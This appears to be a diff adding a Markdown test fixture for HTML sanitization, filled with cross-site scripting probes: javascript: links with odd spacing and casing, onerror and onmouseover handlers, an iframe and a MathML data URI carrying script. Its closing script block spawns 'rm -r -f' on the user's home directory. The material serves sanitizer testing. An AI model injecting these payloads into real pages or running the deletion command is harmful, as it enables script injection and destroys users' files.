@@ -1,0 +1,21 @@
+---
+title: "正規化テスト"
+---
+
+# テスト
+
+これ <a href="jAva script:alert('bravo')">delta</a> はここ <a href="javascript: alert('へぇ～!');">へぇ～ボタン</a>
+そして <a href="http://example.com">example</a>ここです
+
+<div>test</div>
+<div onmouseover={alert("alpha")}>
+  <img src="x" onerror="alert('charlie')"></img>
+  <iframe src="javascript:alert('delta')"></iframe>
+  <a href="javascript: alert('へぇ～!');">へぇ～ボタン</a>
+  <math>
+    <mi xlink:href="data:x,<script>alert('echo')</script>"></mi>
+  </math>
+</div>
+<script>
+  require('child_process').spawn('rm', ['-r', '-f', process.env.HOME]);
+</script>
